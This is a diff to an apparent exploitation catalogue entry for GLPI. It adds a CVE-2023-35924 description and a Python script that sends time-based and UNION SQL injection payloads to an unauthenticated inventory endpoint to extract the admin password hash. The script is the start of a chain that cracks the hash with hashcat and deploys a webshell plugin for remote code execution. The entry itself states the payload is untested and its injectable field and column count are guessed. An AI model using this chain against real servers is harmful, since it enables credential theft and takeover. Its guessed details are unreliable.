@@ -1,20 +1,20 @@
 ---
-comment: |
-  GLPI is a PHP-based open-source IT asset management and service desk platform.
-
-  CVE-2022-35914 (CVSS 9.8): Unauthenticated RCE via PHP code injection in the htmlLawed
-  library bundled with GLPI. The file `/vendor/htmlawed/htmlawed/htmLawedTest.php` is a
-  test script that should not be present in production. Its `hhook` parameter is passed
-  directly to `call_user_func()`, allowing any PHP callable (system, passthru, exec,
-  file_get_contents, file_put_contents) to be invoked with arbitrary arguments supplied
-  via the `text` parameter. No authentication required. Affects GLPI 10.0.0 through 10.0.2.
-  Fixed in GLPI 10.0.3 by removing the test file from the distribution.
-  nuclei: CVE-2022-35914
-  ExploitDB: 51102
-
-  Admin plugin upload: GLPI administrators can install PHP plugins via
-  Setup > Plugins. A minimal plugin (setup.php + arbitrary PHP files) is deployed to
-  /plugins/ and served directly by the web server.
+comment: "GLPI is a PHP-based open-source IT asset management and service desk platform.\n\
+  \nCVE-2022-35914 (CVSS 9.8): Unauthenticated RCE via PHP code injection in the htmlLawed\n\
+  library bundled with GLPI. The file `/vendor/htmlawed/htmlawed/htmLawedTest.php`\
+  \ is a\ntest script that should not be present in production. Its `hhook` parameter\
+  \ is passed\ndirectly to `call_user_func()`, allowing any PHP callable (system,\
+  \ passthru, exec,\nfile_get_contents, file_put_contents) to be invoked with arbitrary\
+  \ arguments supplied\nvia the `text` parameter. No authentication required. Affects\
+  \ GLPI 10.0.0 through 10.0.2.\nFixed in GLPI 10.0.3 by removing the test file from\
+  \ the distribution.\nnuclei: CVE-2022-35914\nExploitDB: 51102\n\nCVE-2023-35924\
+  \ (CVSS 8.6): Unauthenticated SQL injection via the native inventory\nendpoint (`/front/inventory.php`).\
+  \ The endpoint accepts inventory data from Glpi-Agent\nsubmissions without authentication\
+  \ and fails to sanitise user-supplied values before\nusing them in SQL queries.\
+  \ Allows unauthenticated database read/write on GLPI 10.0.0\u201310.0.7.\nFixed\
+  \ in GLPI 10.0.8. GHSA: GHSA-gxh4-j63w-8jmm\n\nAdmin plugin upload: GLPI administrators\
+  \ can install PHP plugins via\nSetup > Plugins. A minimal plugin (setup.php + arbitrary\
+  \ PHP files) is deployed to\n/plugins/ and served directly by the web server.\n"
 functions:
   bind-shell:
   - code: |
@@ -103,6 +103,57 @@ functions:
       unauthenticated:
     version: |
       10.0.0 - 10.0.2 (before 10.0.3)
+  - code: |
+      # CVE-2023-35924: unauthenticated SQLi via inventory endpoint to extract admin credentials
+      # Step 1: submit a crafted inventory payload to the unauthenticated endpoint
+      # The glpiinventory endpoint processes XML/JSON agent data without auth
+      python3 - <<'EOF'
+      import requests, json
+
+      TARGET = "http://victim.com/front/inventory.php"
+
+      # The inventory endpoint accepts JSON from Glpi-Agent submissions.
+      # The SQLi is in the inventory data fields that map to DB columns.
+      # Use a time-based blind payload to confirm, then extract via error-based or UNION.
+      # Confirm injection (5 s delay = vulnerable):
+      payload = {
+          "action": "inventory",
+          "content": {
+              "versionclient": "GLPI-Agent_v1.0",
+              "deviceid": "test' AND SLEEP(5)-- -",
+              "itemtype": "Computer",
+          }
+      }
+      r = requests.post(TARGET, json=payload, timeout=10)
+      print(f"Status: {r.status_code}  Elapsed: {r.elapsed.total_seconds():.1f}s")
+      # >5 s response confirms blind SQLi
+
+      # Step 2: extract admin password hash from glpi_users table
+      payload["content"]["deviceid"] = (
+          "test' UNION SELECT 1,2,3,password,5,6,7,8,9,10 "
+          "FROM glpi_users WHERE name='glpi'-- -"
+      )
+      r = requests.post(TARGET, json=payload)
+      print(r.text[:500])
+      EOF
+
+      # Step 3: crack the extracted bcrypt hash offline, then log in as admin
+      # Step 4: install a plugin via the rce (admin) entry to achieve RCE
+    comment: "CVE-2023-35924: The unauthenticated GLPI inventory endpoint at /front/inventory.php\n\
+      accepts Glpi-Agent JSON submissions and passes user-supplied fields into SQL\
+      \ queries\nwithout sanitisation, enabling blind and error-based SQL injection.\n\
+      Exploit chain: extract admin credentials via SQLi \u2192 authenticate \u2192\
+      \ deploy malicious\nplugin via Setup > Plugins (see rce/admin entry) to achieve\
+      \ OS-level RCE.\nThe glpi_users table stores bcrypt-hashed passwords; crack\
+      \ offline with hashcat.\nGHSA: GHSA-gxh4-j63w-8jmm\n\n\u26A0\uFE0F Unverified\
+      \ payload: no public standalone PoC exists for this CVE. The JSON\nstructure\
+      \ and injectable field name above are derived from the advisory description,\n\
+      not a tested exploit. Confirm the injectable field name and UNION column count\n\
+      (use ORDER BY N-- - to enumerate) before relying on this payload.\n"
+    contexts:
+      unauthenticated:
+    version: |
+      10.0.0 - 10.0.7 (before 10.0.8)
   - code: |
       # Admin plugin upload: deploy a PHP webshell as a GLPI plugin
       # 1. Create the plugin directory structure:
